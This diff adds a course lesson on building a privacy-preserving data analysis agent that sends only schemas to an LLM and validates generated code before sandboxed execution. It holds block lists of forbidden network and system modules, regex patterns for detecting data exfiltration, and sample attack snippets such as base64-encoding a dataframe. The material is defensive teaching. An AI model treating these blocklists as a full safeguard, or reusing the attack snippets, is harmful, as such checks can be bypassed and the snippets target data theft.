@@ -1,0 +1,1997 @@
+---
+title: "Project 3: The Local-First Secure Data Analyst"
+description: "Building a privacy-preserving agent that analyzes sensitive data without exposing it to external APIs."
+week: 11
+day: 77
+---
+
+<ReadingTime minutes={40} />
+
+<Callout type="info">
+  **Project Tier:** This is a **Tier 4 Project** (4-8 hours). It combines
+  privacy engineering, local LLM deployment, and secure sandboxing into an
+  end-to-end system. Prerequisites: Complete foundational exercises from Days 1-30 and POC-01
+  (LangGraph State Machine) first.
+</Callout>
+
+<SkillLevel level="advanced" description="Privacy engineering" />
+
+<Prerequisites
+  items={[
+    "Understanding of agent architectures (Days 01-03)",
+    "Familiarity with LangGraph (Day 09)",
+    "Basic knowledge of data privacy regulations (GDPR, HIPAA)",
+  ]}
+/>
+
+<LearningObjectives
+  objectives={[
+    "Design privacy-preserving agent architectures",
+    "Implement the 'Blind Programmer' pattern for secure data analysis",
+    "Use E2B sandboxes for secure code execution",
+    "Deploy local LLMs with Ollama for maximum privacy",
+    "Build local-first RAG with LanceDB",
+  ]}
+/>
+
+## Project Overview
+
+**Objective**: Build a data analysis agent that runs entirely within a secure perimeter, analyzing sensitive financial data without ever sending raw data to external LLM APIs.
+
+**Why This Matters**: Regulated industries (finance, healthcare) cannot use tools like ChatGPT's Data Analyst because uploading customer data violates GDPR/HIPAA. This project shows how to build compliant AI systems.
+
+**Skills Showcased**:
+
+- Privacy-preserving architecture
+- Secure code execution (sandboxing)
+- Local LLM deployment
+- Schema-based reasoning
+
+---
+
+## Project Requirements Document
+
+This section provides comprehensive requirements for implementing the Local-First Secure Data Analyst. Use this as a reference for estimation, implementation, and verification.
+
+### User Stories
+
+| ID    | User Story                                                                                                                                  | Priority |
+| :---- | :------------------------------------------------------------------------------------------------------------------------------------------ | :------- |
+| US-01 | As a **data analyst**, I want to ask natural language questions about my dataset, so that I can get insights without writing code manually. | P0       |
+| US-02 | As a **compliance officer**, I want to ensure no raw data is sent to external APIs, so that we maintain GDPR/HIPAA compliance.              | P0       |
+| US-03 | As a **data analyst**, I want the system to generate visualizations, so that I can include charts in my reports.                            | P1       |
+| US-04 | As a **security engineer**, I want all generated code validated before execution, so that malicious code cannot exfiltrate data.            | P0       |
+| US-05 | As a **data analyst**, I want to use a local LLM option, so that even metadata stays on-premises.                                           | P1       |
+| US-06 | As a **data analyst**, I want to query documents using RAG, so that I can ask questions about unstructured data.                            | P2       |
+| US-07 | As a **IT administrator**, I want configurable column name anonymization, so that even schema information is protected.                     | P2       |
+| US-08 | As a **data analyst**, I want clear error messages when analysis fails, so that I can refine my questions.                                  | P1       |
+
+### Acceptance Criteria
+
+#### US-01: Natural Language Queries
+
+- **Given** a user loads a CSV/Parquet dataset
+- **When** they ask a natural language question (e.g., "What's the average revenue by region?")
+- **Then** the system:
+  - Extracts schema from the dataset
+  - Generates appropriate pandas/matplotlib code
+  - Executes the code and returns results
+  - Provides a natural language summary of findings
+
+#### US-02: Data Privacy Guarantee
+
+- **Given** a dataset is loaded
+- **When** the LLM is invoked
+- **Then** the system:
+  - Sends ONLY schema information (column names, types, row count)
+  - NEVER sends actual data values to the LLM
+  - Logs can be audited to verify no data leakage
+
+#### US-03: Visualization Generation
+
+- **Given** a user requests a visualization (e.g., "Plot sales over time")
+- **When** the analysis completes
+- **Then** the system:
+  - Generates matplotlib/seaborn code
+  - Saves chart to `output.png`
+  - Returns the chart as base64 or file path
+
+#### US-04: Code Validation
+
+- **Given** the LLM generates Python code
+- **When** the code is about to execute
+- **Then** the system:
+  - Parses code with AST
+  - Blocks forbidden imports (os, sys, subprocess, requests, etc.)
+  - Blocks forbidden functions (exec, eval, open, **import**, etc.)
+  - Rejects code that fails validation with clear error message
+
+#### US-05: Local LLM Support
+
+- **Given** the user configures `USE_LOCAL_LLM=true`
+- **When** analysis is requested
+- **Then** the system:
+  - Uses Ollama with codellama or mistral model
+  - All processing happens on local machine
+  - No network calls to external LLM APIs
+
+#### US-06: Document RAG
+
+- **Given** the user loads documents into LanceDB
+- **When** they ask a question about document content
+- **Then** the system:
+  - Uses local embeddings (sentence-transformers)
+  - Retrieves relevant chunks from LanceDB
+  - Generates answer based on retrieved context
+
+#### US-07: Schema Anonymization
+
+- **Given** anonymization is enabled
+- **When** schema is sent to LLM
+- **Then** the system:
+  - Replaces column names with generic labels (column_0, column_1, etc.)
+  - Maintains a mapping for de-anonymization
+  - De-anonymizes generated code before execution
+
+### System Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    Local-First Secure Data Analyst                           │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        User Interface Layer                            │ │
+│  │  ┌─────────────────┐    ┌─────────────────┐                           │ │
+│  │  │  Query Input    │    │  Results Display │                           │ │
+│  │  │  (NL Question)  │    │  (Text + Charts) │                           │ │
+│  │  └─────────────────┘    └─────────────────┘                           │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                    │                                         │
+│                                    ▼                                         │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        Schema Extraction Layer                         │ │
+│  │  ┌─────────────────┐    ┌─────────────────┐                           │ │
+│  │  │ Schema Extractor│───▶│   Anonymizer    │ (Optional)                │ │
+│  │  │ (No Data Values)│    │ (Column Masking)│                           │ │
+│  │  └─────────────────┘    └─────────────────┘                           │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                    │                                         │
+│                                    ▼ (Schema Only - No Data!)                │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        Code Generation Layer                           │ │
+│  │  ┌─────────────────┐                                                   │ │
+│  │  │   LLM Engine    │  (OpenAI API or Local Ollama)                    │ │
+│  │  │ (Sees Schema,   │                                                   │ │
+│  │  │  Not Data)      │                                                   │ │
+│  │  └─────────────────┘                                                   │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                    │                                         │
+│                                    ▼                                         │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        Validation Layer                                │ │
+│  │  ┌─────────────────┐    ┌─────────────────┐                           │ │
+│  │  │  AST Parser     │───▶│ Security Checker│                           │ │
+│  │  │                 │    │ (Import/Func    │                           │ │
+│  │  │                 │    │  Blocklist)     │                           │ │
+│  │  └─────────────────┘    └─────────────────┘                           │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                    │                                         │
+│                                    ▼ (Only if validated)                     │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        Secure Execution Layer                          │ │
+│  │  ╔═══════════════════════════════════════════════════════════════════╗ │ │
+│  │  ║                    E2B Sandbox / Local Exec                       ║ │ │
+│  │  ║  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐           ║ │ │
+│  │  ║  │  Sensitive  │───▶│   pandas    │───▶│   Results   │           ║ │ │
+│  │  ║  │    Data     │    │   Code      │    │   Only      │           ║ │ │
+│  │  ║  └─────────────┘    └─────────────┘    └─────────────┘           ║ │ │
+│  │  ╚═══════════════════════════════════════════════════════════════════╝ │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                    │                                         │
+│                                    ▼                                         │
+│  ┌────────────────────────────────────────────────────────────────────────┐ │
+│  │                        Response Layer                                  │ │
+│  │  ┌─────────────────┐    ┌─────────────────┐                           │ │
+│  │  │   Summarizer    │    │  Chart Renderer │                           │ │
+│  │  │   (Results→NL)  │    │  (PNG Output)   │                           │ │
+│  │  └─────────────────┘    └─────────────────┘                           │ │
+│  └────────────────────────────────────────────────────────────────────────┘ │
+│                                                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  Optional Components                                                         │
+│  ┌────────────┐  ┌────────────┐  ┌────────────┐                             │
+│  │  LanceDB   │  │   Ollama   │  │    E2B     │                             │
+│  │ (Local RAG)│  │(Local LLM) │  │ (Sandbox)  │                             │
+│  └────────────┘  └────────────┘  └────────────┘                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+| Component            | Responsibility                           | Data Exposure                  |
+| :------------------- | :--------------------------------------- | :----------------------------- |
+| **Schema Extractor** | Extract column names, types, stats       | ❌ No raw values               |
+| **Anonymizer**       | Replace column names with generic labels | ❌ No raw values               |
+| **LLM Engine**       | Generate pandas code from schema + query | ⚠️ Schema only                 |
+| **AST Validator**    | Parse and validate generated code        | ❌ No data access              |
+| **Security Checker** | Block dangerous imports/functions        | ❌ No data access              |
+| **E2B Sandbox**      | Execute validated code with data         | ✅ Full data access (isolated) |
+| **Summarizer**       | Convert results to natural language      | ✅ Results only                |
+
+### State Machine Design
+
+<Mermaid
+  chart={`
+stateDiagram-v2
+    [*] --> Idle
+    
+    Idle --> LoadingData: load_dataset
+    
+    LoadingData --> DataReady: load_success
+    LoadingData --> Error: load_failed
+    
+    DataReady --> ExtractingSchema: submit_query
+    
+    ExtractingSchema --> SchemaReady: extraction_complete
+    
+    SchemaReady --> Anonymizing: anonymization_enabled
+    SchemaReady --> GeneratingCode: anonymization_disabled
+    
+    Anonymizing --> GeneratingCode: anonymization_complete
+    
+    GeneratingCode --> CodeGenerated: generation_success
+    GeneratingCode --> Error: generation_failed
+    
+    CodeGenerated --> Validating: auto_transition
+    
+    Validating --> ValidationPassed: code_safe
+    Validating --> ValidationFailed: code_unsafe
+    
+    ValidationFailed --> GeneratingCode: retry_with_feedback
+    ValidationFailed --> Error: max_retries_exceeded
+    
+    ValidationPassed --> Executing: auto_transition
+    
+    Executing --> ExecutionComplete: execution_success
+    Executing --> ExecutionFailed: execution_error
+    
+    ExecutionFailed --> GeneratingCode: retry_with_error
+    ExecutionFailed --> Error: max_retries_exceeded
+    
+    ExecutionComplete --> Summarizing: auto_transition
+    
+    Summarizing --> Complete: summary_ready
+    
+    Complete --> DataReady: new_query
+    Complete --> Idle: unload_data
+    
+    Error --> Idle: reset
+`}
+/>
+
+| State               | Description                      | Timeout | Valid Transitions                    |
+| :------------------ | :------------------------------- | :------ | :----------------------------------- |
+| `Idle`              | No data loaded                   | None    | → LoadingData                        |
+| `LoadingData`       | Reading CSV/Parquet file         | 30s     | → DataReady, Error                   |
+| `DataReady`         | Data loaded, awaiting query      | None    | → ExtractingSchema                   |
+| `ExtractingSchema`  | Building schema from dataframe   | 5s      | → SchemaReady                        |
+| `SchemaReady`       | Schema extracted                 | 1s      | → Anonymizing, GeneratingCode        |
+| `Anonymizing`       | Replacing column names           | 1s      | → GeneratingCode                     |
+| `GeneratingCode`    | LLM generating pandas code       | 30s     | → CodeGenerated, Error               |
+| `CodeGenerated`     | Code received from LLM           | 1s      | → Validating                         |
+| `Validating`        | AST parsing and security check   | 5s      | → ValidationPassed, ValidationFailed |
+| `ValidationFailed`  | Code contains forbidden patterns | N/A     | → GeneratingCode, Error              |
+| `ValidationPassed`  | Code is safe to execute          | 1s      | → Executing                          |
+| `Executing`         | Running code in sandbox          | 60s     | → ExecutionComplete, ExecutionFailed |
+| `ExecutionFailed`   | Code raised exception            | N/A     | → GeneratingCode, Error              |
+| `ExecutionComplete` | Results available                | 1s      | → Summarizing                        |
+| `Summarizing`       | Converting results to NL         | 15s     | → Complete                           |
+| `Complete`          | Analysis finished                | None    | → DataReady, Idle                    |
+| `Error`             | Unrecoverable error              | None    | → Idle                               |
+
+### Tool Specifications
+
+#### Tool: `extract_safe_schema`
+
+| Attribute            | Value                                                                      |
+| :------------------- | :------------------------------------------------------------------------- |
+| **Purpose**          | Extract schema without exposing data values                                |
+| **Input**            | `df: pd.DataFrame`                                                         |
+| **Output**           | `{columns: [{name, dtype, null_count, unique_count, example}], row_count}` |
+| **Privacy**          | Examples are synthetic (e.g., "[text value]", "123.45")                    |
+| **Error Conditions** | Empty dataframe → return minimal schema                                    |
+
+#### Tool: `anonymize_schema`
+
+| Attribute            | Value                                         |
+| :------------------- | :-------------------------------------------- |
+| **Purpose**          | Replace column names with generic labels      |
+| **Input**            | `schema: dict`                                |
+| **Output**           | `{anonymized_schema: dict, column_map: dict}` |
+| **Mapping**          | `{"column_0": "original_name", ...}`          |
+| **Error Conditions** | None expected                                 |
+
+#### Tool: `generate_analysis_code`
+
+| Attribute              | Value                                               |
+| :--------------------- | :-------------------------------------------------- |
+| **Purpose**            | Generate pandas code from schema and query          |
+| **Input**              | `schema: dict, query: str`                          |
+| **Output**             | `str` (Python code)                                 |
+| **Model**              | gpt-4o (API) or codellama:13b (local)               |
+| **Prompt Constraints** | Must use `df` variable, save charts to `output.png` |
+| **Error Conditions**   | Invalid response → retry with clarification         |
+
+#### Tool: `validate_code`
+
+| Attribute               | Value                                                                             |
+| :---------------------- | :-------------------------------------------------------------------------------- |
+| **Purpose**             | Check code for security issues                                                    |
+| **Input**               | `code: str`                                                                       |
+| **Output**              | `{is_valid: bool, message: str}`                                                  |
+| **Forbidden Imports**   | os, sys, subprocess, socket, requests, urllib, http, ftplib, smtplib, pickle      |
+| **Forbidden Functions** | exec, eval, compile, open, **import**, getattr, setattr, delattr, globals, locals |
+| **Error Conditions**    | Syntax error → return invalid with parse error                                    |
+
+#### Tool: `execute_in_sandbox`
+
+| Attribute            | Value                                                      |
+| :------------------- | :--------------------------------------------------------- |
+| **Purpose**          | Run validated code in isolated environment                 |
+| **Input**            | `code: str, data_path: str`                                |
+| **Output**           | `{output: str, error: str, chart: base64}`                 |
+| **Sandbox**          | E2B Code Interpreter (production) or restricted exec (dev) |
+| **Timeout**          | 60 seconds                                                 |
+| **Error Conditions** | Timeout → kill process, return error                       |
+
+#### Tool: `summarize_results`
+
+| Attribute            | Value                                        |
+| :------------------- | :------------------------------------------- |
+| **Purpose**          | Convert execution output to natural language |
+| **Input**            | `query: str, output: str`                    |
+| **Output**           | `str` (natural language summary)             |
+| **Model**            | gpt-4o or local LLM                          |
+| **Error Conditions** | Empty output → return "No results found"     |
+
+### Security Requirements
+
+| Requirement               | Implementation                                           | Priority |
+| :------------------------ | :------------------------------------------------------- | :------- |
+| **No Data to LLM**        | Schema extractor strips all values, sends only structure | P0       |
+| **Code Validation**       | AST-based blocklist for imports and functions            | P0       |
+| **Sandbox Isolation**     | E2B sandbox with no network access                       | P0       |
+| **No File System Access** | Block `open()`, only allow `output.png` write            | P0       |
+| **No Network Access**     | Block all network-related imports                        | P0       |
+| **No Code Injection**     | Block `exec`, `eval`, `compile`                          | P0       |
+| **Column Anonymization**  | Optional masking of column names                         | P1       |
+| **Audit Logging**         | Log all queries and generated code (not data)            | P1       |
+| **Local LLM Option**      | Ollama support for air-gapped environments               | P1       |
+| **Data Retention**        | No caching of sensitive data                             | P0       |
+
+#### Forbidden Import List (Complete)
+
+```python
+FORBIDDEN_IMPORTS = [
+    'os', 'sys', 'subprocess', 'socket', 'requests',
+    'urllib', 'http', 'ftplib', 'smtplib', 'pickle',
+    'shelve', 'marshal', 'importlib', 'builtins',
+    'ctypes', 'multiprocessing', 'threading',
+    'asyncio', 'concurrent', 'signal', 'resource'
+]
+```
+
+#### Forbidden Function List (Complete)
+
+```python
+FORBIDDEN_FUNCTIONS = [
+    'exec', 'eval', 'compile', 'open', '__import__',
+    'getattr', 'setattr', 'delattr', 'globals', 'locals',
+    'vars', 'dir', 'type', 'isinstance', 'issubclass',
+    'callable', 'classmethod', 'staticmethod', 'property',
+    'super', 'object', 'memoryview', 'bytearray'
+]
+```
+
+### Performance Requirements
+
+| Metric                        | Target            | Measurement                       |
+| :---------------------------- | :---------------- | :-------------------------------- |
+| **Data loading (100MB CSV)**  | < 5 seconds       | Time to load and extract schema   |
+| **Schema extraction**         | < 1 second        | Time to build schema dict         |
+| **Code generation (API)**     | < 10 seconds      | Time for LLM to generate code     |
+| **Code generation (local)**   | < 30 seconds      | Time for Ollama to generate code  |
+| **Code validation**           | < 500ms           | Time for AST parsing and checks   |
+| **Sandbox execution**         | < 60 seconds      | Time limit for code execution     |
+| **Chart generation**          | < 10 seconds      | Time to render matplotlib chart   |
+| **End-to-end (simple query)** | < 30 seconds      | Total time for basic analysis     |
+| **Memory usage**              | < 2x dataset size | Peak memory during analysis       |
+| **Concurrent queries**        | 1 per dataset     | Sequential processing per session |
+
+### Deployment Checklist
+
+#### Pre-Deployment
+
+- [ ] Environment variables configured:
+  - [ ] `OPENAI_API_KEY` - For cloud LLM (optional if using local)
+  - [ ] `E2B_API_KEY` - For E2B sandbox (optional if using local exec)
+  - [ ] `USE_LOCAL_LLM` - Set to "true" for Ollama
+  - [ ] `OLLAMA_MODEL` - Model name (default: codellama:13b)
+- [ ] Dependencies installed:
+  - [ ] `langgraph`, `langchain`, `langchain-openai`
+  - [ ] `pandas`, `matplotlib`, `seaborn`, `tabulate`
+  - [ ] `e2b-code-interpreter` (for sandbox)
+  - [ ] `lancedb` (for RAG)
+- [ ] Local LLM setup (if using):
+  - [ ] Ollama installed and running
+  - [ ] Model pulled: `ollama pull codellama:13b`
+
+#### Smoke Tests
+
+- [ ] **Test 1: Basic Query** - Load sample CSV, ask "What are the column names?" → Returns column list
+- [ ] **Test 2: Aggregation** - Ask "What's the average of column X?" → Returns numeric result
+- [ ] **Test 3: Visualization** - Ask "Plot column X over time" → Chart saved to output.png
+- [ ] **Test 4: Security Block** - Inject `import os` in prompt → Code validation fails
+- [ ] **Test 5: Local LLM** - Enable Ollama, run basic query → Works without API calls
+
+#### Post-Deployment Verification
+
+- [ ] Verify no data in LLM logs (audit schema-only)
+- [ ] Test with sensitive column names (SSN, email) → Anonymization works
+- [ ] Monitor sandbox resource usage
+- [ ] Validate E2B sandbox network isolation
+
+#### Compliance Verification
+
+- [ ] Document data flow for GDPR/HIPAA audit
+- [ ] Verify no PII in any external API calls
+- [ ] Test with compliance team using sample PHI data
+- [ ] Generate compliance report showing data isolation
+
+---
+
+## 15.1 The Privacy Challenge
+
+{/* IMAGE_PLACEHOLDER: Create an illustration showing two contrasting data analysis workflows side-by-side:
+LEFT SIDE (marked with red X): Traditional approach showing sensitive data (represented by documents with personal info icons like SSN, medical records) being uploaded directly to a cloud with "LLM API" label, with warning symbols indicating data exposure risk.
+RIGHT SIDE (marked with green checkmark): Privacy-first approach showing the same sensitive data staying in a secure vault/safe, with only a schema document (showing just column names and types, no actual data) being sent to the LLM, which generates code that executes back in the secure environment. Use lock icons and shield symbols to emphasize security.
+Style: Modern, clean infographic style with clear visual separation between the two approaches. Use red/orange for the risky approach and green/blue for the secure approach. */}
+
+<Mermaid
+  chart={`
+graph LR
+    subgraph "❌ Traditional Approach"
+        Data1[Sensitive Data] -->|Upload| Cloud[Cloud LLM]
+        Cloud -->|Analysis| Result1[Results]
+    end
+    
+    subgraph "✅ Privacy-First Approach"
+        Data2[Sensitive Data] -->|Schema Only| LLM[LLM]
+        LLM -->|Code| Sandbox[Secure Sandbox]
+        Data2 -->|Load| Sandbox
+        Sandbox -->|Results Only| Result2[Results]
+    end
+`}
+/>
+
+### The "Blind Programmer" Pattern
+
+{/* IMAGE_PLACEHOLDER: Create a conceptual illustration of the "Blind Programmer" pattern:
+Show an LLM (represented as a robot or AI entity) wearing a blindfold, sitting at a desk with a blueprint/schema document in front of it (showing only column names like "age: int", "income: float", "region: string"). The LLM is writing code on a computer screen. Behind a secure wall/barrier, show the actual sensitive data (represented as a locked database or file cabinet with "CONFIDENTIAL" labels). An arrow shows the generated code going through a security checkpoint (validator) before entering the secure area to process the real data. The results (charts, numbers) come back out through the secure barrier.
+Style: Metaphorical illustration that makes the concept memorable. Use visual metaphors like blindfolds, walls, and locks to emphasize the privacy-preserving nature. Color scheme: blues and greens for security, with the LLM in neutral colors. */}
+
+The LLM never sees the actual data—only the schema (column names, types). It writes code to analyze data it cannot see, and that code runs in an isolated sandbox.
+
+![Secure Sandbox](/images/secure_sandbox.png)
+
+---
+
+## 15.2 Architecture
+
+<Mermaid
+  chart={`
+graph TB
+    User([User Query]) --> Schema[Schema Extractor]
+    Schema -->|Column Names Only| LLM[LLM - Local or API]
+    LLM -->|Python Code| Validator[Code Validator]
+    Validator -->|Safe Code| Sandbox[E2B Sandbox]
+    
+    subgraph "Secure Perimeter"
+        Data[(Sensitive Data)]
+        Sandbox
+        Data -->|Load| Sandbox
+    end
+    
+    Sandbox -->|Results/Charts| User
+    
+    style Data fill:#f66,stroke:#333
+    style Sandbox fill:#6f6,stroke:#333
+`}
+/>
+
+### Components
+
+| Component            | Purpose                    | Security Role             |
+| :------------------- | :------------------------- | :------------------------ |
+| **Schema Extractor** | Extract column names/types | Strips actual values      |
+| **LLM**              | Generate analysis code     | Never sees data           |
+| **Code Validator**   | Check for malicious code   | Prevent data exfiltration |
+| **Sandbox**          | Execute code safely        | Isolated environment      |
+
+---
+
+## 15.3 Implementation
+
+### Step 1: Schema Extraction
+
+{/* IMAGE_PLACEHOLDER: Create a diagram showing the schema extraction process:
+Show a database table with actual sensitive data (rows with values like "John Doe", "SSN: 123-45-6789", "$50,000") on the left. An arrow points to a "Schema Extractor" component in the middle. On the right, show the extracted schema as a clean document containing only metadata: column names ("name", "ssn", "salary"), data types ("string", "string", "float"), and statistics ("1000 rows", "3 null values") - but NO actual data values. Use a filter/funnel metaphor to show how actual data is stripped away.
+Style: Technical diagram with clear before/after comparison. Use icons for data types (text icon, number icon, etc.). Color code: raw data in gray/neutral, schema in blue/safe colors. */}
+
+```python
+import pandas as pd
+
+def extract_safe_schema(df: pd.DataFrame) -> dict:
+    """Extract schema without exposing actual data."""
+    schema = {
+        "columns": [],
+        "row_count": len(df),
+        "sample_values": {}  # Synthetic examples only
+    }
+
+    for col in df.columns:
+        col_info = {
+            "name": col,
+            "dtype": str(df[col].dtype),
+            "null_count": int(df[col].isnull().sum()),
+            "unique_count": int(df[col].nunique())
+        }
+
+        # Add synthetic examples based on dtype
+        if df[col].dtype == 'object':
+            col_info["example"] = "[text value]"
+        elif df[col].dtype in ['int64', 'float64']:
+            col_info["example"] = "123.45"
+            col_info["min"] = float(df[col].min())
+            col_info["max"] = float(df[col].max())
+        elif df[col].dtype == 'datetime64[ns]':
+            col_info["example"] = "2024-01-15"
+
+        schema["columns"].append(col_info)
+
+    return schema
+
+# Usage
+df = pd.read_csv("sensitive_transactions.csv")
+schema = extract_safe_schema(df)
+
+# Schema contains NO actual values, just structure
+print(json.dumps(schema, indent=2))
+```
+
+### Step 2: Code Generation
+
+````python
+from langchain_openai import ChatOpenAI
+
+CODE_GEN_PROMPT = """
+You are a data analyst. Write Python code to analyze a dataset.
+
+IMPORTANT: You cannot see the actual data. You only have the schema.
+The data will be loaded as a pandas DataFrame called `df`.
+
+Dataset Schema:
+{schema}
+
+User Request: {query}
+
+Requirements:
+1. Use pandas for data manipulation
+2. Use matplotlib/seaborn for visualizations
+3. Print results clearly
+4. Save any charts to 'output.png'
+5. Do NOT try to access external resources
+6. Do NOT try to read/write files other than output.png
+
+Write only the Python code, no explanations.
+"""
+
+def generate_analysis_code(schema: dict, query: str) -> str:
+    """Generate analysis code based on schema."""
+    llm = ChatOpenAI(model="gpt-4o")
+
+    response = llm.invoke(
+        CODE_GEN_PROMPT.format(
+            schema=json.dumps(schema, indent=2),
+            query=query
+        )
+    )
+
+    code = response.content
+
+    # Clean up code blocks
+    if "```python" in code:
+        code = code.split("```python")[1].split("```")[0]
+
+    return code.strip()
+````
+
+### Step 3: Code Validation
+
+{/* IMAGE_PLACEHOLDER: Create an illustration of the code validation security checkpoint:
+Show generated Python code entering a security scanner (represented as a checkpoint gate or TSA-style scanner). Inside the scanner, show multiple validation layers: 1) AST Parser checking syntax, 2) Import Blocker with a list of forbidden modules (os, sys, subprocess) marked with X symbols, 3) Function Blocker checking for dangerous functions (exec, eval, open) also marked with X, 4) Pattern Detector scanning for data exfiltration attempts (base64 encoding, network calls). Safe code gets a green checkmark and passes through; malicious code gets a red X and is blocked. Show examples of blocked code snippets in red bubbles.
+Style: Security-focused illustration with checkpoint/scanner metaphor. Use red for threats, green for safe code, yellow for warnings. Include visual representations of code snippets being analyzed. */}
+
+```python
+import ast
+import re
+
+FORBIDDEN_IMPORTS = [
+    'os', 'sys', 'subprocess', 'socket', 'requests',
+    'urllib', 'http', 'ftplib', 'smtplib', 'pickle'
+]
+
+FORBIDDEN_FUNCTIONS = [
+    'exec', 'eval', 'compile', 'open', '__import__',
+    'getattr', 'setattr', 'delattr', 'globals', 'locals'
+]
+
+def validate_code(code: str) -> tuple[bool, str]:
+    """Validate code for security issues."""
+    try:
+        tree = ast.parse(code)
+    except SyntaxError as e:
+        return False, f"Syntax error: {e}"
+
+    for node in ast.walk(tree):
+        # Check imports
+        if isinstance(node, ast.Import):
+            for alias in node.names:
+                if alias.name.split('.')[0] in FORBIDDEN_IMPORTS:
+                    return False, f"Forbidden import: {alias.name}"
+
+        if isinstance(node, ast.ImportFrom):
+            if node.module and node.module.split('.')[0] in FORBIDDEN_IMPORTS:
+                return False, f"Forbidden import: {node.module}"
+
+        # Check function calls
+        if isinstance(node, ast.Call):
+            if isinstance(node.func, ast.Name):
+                if node.func.id in FORBIDDEN_FUNCTIONS:
+                    return False, f"Forbidden function: {node.func.id}"
+
+    return True, "Code validated successfully"
+```
+
+### Enhanced Code Validation (2024-2025)
+
+{/* INTERACTIVE_COMPONENT_SUGGESTION: Code Security Validator Playground
+Create an interactive security testing tool where learners can:
+1. Write or paste Python code snippets in a code editor
+2. Click "Validate" to run the security checks
+3. See real-time results showing:
+   - ✅ Passed checks (syntax valid, no forbidden imports, no forbidden functions)
+   - ❌ Failed checks with specific error messages ("Forbidden import: os", "Forbidden function: eval")
+   - ⚠️ Warnings (suspicious patterns detected, data export attempts)
+4. Provide preset "attack examples" they can test:
+   - "Direct Import Attack" - code with `import os`
+   - "Indirect Import Attack" - code with `__import__('requests')`
+   - "Base64 Exfiltration" - code with `base64.b64encode(df.to_json())`
+   - "Safe Code" - legitimate pandas analysis code
+5. Show which validation layer caught each issue (AST parser, import blocker, function blocker, pattern detector)
+6. Display a security score and explanation of why code passed/failed
+This hands-on tool helps learners understand security validation deeply and test their own code patterns.
+Component location: After the EnhancedCodeValidator class definition, before "Common Attack Vectors" section */}
+
+The basic validator above catches obvious attacks, but sophisticated exfiltration attempts require deeper analysis:
+
+```python
+import ast
+import re
+import base64
+from typing import Tuple, List
+
+class EnhancedCodeValidator:
+    """Advanced code validation with exfiltration detection."""
+
+    FORBIDDEN_IMPORTS = {
+        # Network
+        'os', 'sys', 'subprocess', 'socket', 'requests', 'urllib',
+        'http', 'ftplib', 'smtplib', 'httpx', 'aiohttp',
+        # Serialization (data exfil vectors)
+        'pickle', 'shelve', 'marshal', 'dill',
+        # System access
+        'ctypes', 'multiprocessing', 'threading', 'signal',
+        # Code execution
+        'importlib', 'builtins', 'code', 'codeop',
+        # File operations
+        'pathlib', 'shutil', 'tempfile', 'glob',
+    }
+
+    FORBIDDEN_FUNCTIONS = {
+        'exec', 'eval', 'compile', 'open', '__import__',
+        'getattr', 'setattr', 'delattr', 'globals', 'locals',
+        'vars', 'dir', 'breakpoint', 'input', 'help',
+    }
+
+    # Patterns that suggest data exfiltration via encoding
+    EXFIL_PATTERNS = [
+        r'base64\.b64encode',
+        r'\.encode\([\'"]hex[\'"]\)',
+        r'binascii\.',
+        r'codecs\.encode',
+        r'zlib\.compress',
+        r'gzip\.compress',
+        r'\.to_json\(\)',  # DataFrame to JSON (potential exfil)
+        r'\.to_dict\(\)',  # DataFrame to dict
+        r'json\.dumps.*df',  # Serializing dataframe
+    ]
+
+    # Suspicious string patterns (DNS exfil, encoded data)
+    SUSPICIOUS_STRINGS = [
+        r'[a-zA-Z0-9+/]{50,}={0,2}',  # Base64-like strings
+        r'\\x[0-9a-fA-F]{2}',  # Hex escape sequences
+        r'0x[0-9a-fA-F]+',  # Hex literals
+    ]
+
+    def validate(self, code: str) -> Tuple[bool, str, List[str]]:
+        """
+        Validate code with detailed warnings.
+        Returns: (is_valid, message, warnings)
+        """
+        warnings = []
+
+        # 1. Syntax check
+        try:
+            tree = ast.parse(code)
+        except SyntaxError as e:
+            return False, f"Syntax error: {e}", []
+
+        # 2. AST-based checks
+        for node in ast.walk(tree):
+            # Import checks
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    module = alias.name.split('.')[0]
+                    if module in self.FORBIDDEN_IMPORTS:
+                        return False, f"Forbidden import: {alias.name}", warnings
+
+            if isinstance(node, ast.ImportFrom):
+                if node.module:
+                    module = node.module.split('.')[0]
+                    if module in self.FORBIDDEN_IMPORTS:
+                        return False, f"Forbidden import: {node.module}", warnings
+
+            # Function call checks
+            if isinstance(node, ast.Call):
+                func_name = self._get_func_name(node)
+                if func_name in self.FORBIDDEN_FUNCTIONS:
+                    return False, f"Forbidden function: {func_name}", warnings
+
+                # Check for attribute access patterns (e.g., df.to_csv)
+                if isinstance(node.func, ast.Attribute):
+                    if node.func.attr in ['to_csv', 'to_excel', 'to_parquet']:
+                        # Allow only output.png, block data export
+                        warnings.append(f"Data export detected: {node.func.attr}")
+
+            # String literal checks (embedded payloads)
+            if isinstance(node, ast.Constant) and isinstance(node.value, str):
+                for pattern in self.SUSPICIOUS_STRINGS:
+                    if re.search(pattern, node.value):
+                        warnings.append(f"Suspicious string pattern detected")
+                        break
+
+        # 3. Regex-based exfiltration pattern checks
+        for pattern in self.EXFIL_PATTERNS:
+            if re.search(pattern, code):
+                return False, f"Potential data exfiltration pattern: {pattern}", warnings
+
+        # 4. Check for dynamic attribute access
+        if re.search(r'__\w+__', code):
+            dunder_matches = re.findall(r'__\w+__', code)
+            allowed_dunders = {'__name__', '__doc__', '__init__'}
+            for match in dunder_matches:
+                if match not in allowed_dunders:
+                    return False, f"Forbidden dunder access: {match}", warnings
+
+        return True, "Code validated successfully", warnings
+
+    def _get_func_name(self, node: ast.Call) -> str:
+        """Extract function name from Call node."""
+        if isinstance(node.func, ast.Name):
+            return node.func.id
